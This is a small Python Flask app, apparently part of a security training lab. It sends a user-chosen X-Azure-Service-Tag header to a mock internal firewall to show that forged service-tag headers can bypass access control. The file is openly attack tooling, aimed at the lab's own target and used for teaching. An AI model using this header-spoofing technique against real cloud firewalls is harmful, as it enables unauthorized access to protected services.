"""Service Tag Spoofing — forge X-Azure-Service header to bypass firewall."""
import os, urllib.request
from flask import Flask, request, render_template_string

app = Flask(__name__)
FW = os.environ.get("FW_URL","http://firewall:5000")

HTML="""<!DOCTYPE html><html><head><title>Firewall Bypass</title></head><body>
<h1>Cloud Firewall — Request Tester</h1>
<p>Internal API is behind a cloud firewall. Test access with different service tags.</p>
<form method=get action=/bypass>
<label>Service Tag: <input name=tag placeholder="e.g. AzureCloud"></label>
<button>Send Request</button></form><pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML,output="Ready — enter a service tag value")

@app.route("/bypass")
def bypass():
    tag=request.args.get("tag","")
    if not tag:
        return render_template_string(HTML,output="Error: tag parameter required")
    try:
        r=urllib.request.urlopen(urllib.request.Request(f"{FW}/access",
            headers={"X-Azure-Service-Tag":tag}),timeout=5)
        return render_template_string(HTML,output=f"[+] Response: {r.read().decode()}")
    except Exception as e: return render_template_string(HTML,output=f"[-] Error: {e}")

if __name__=="__main__": app.run(host="0.0.0.0",port=5000)
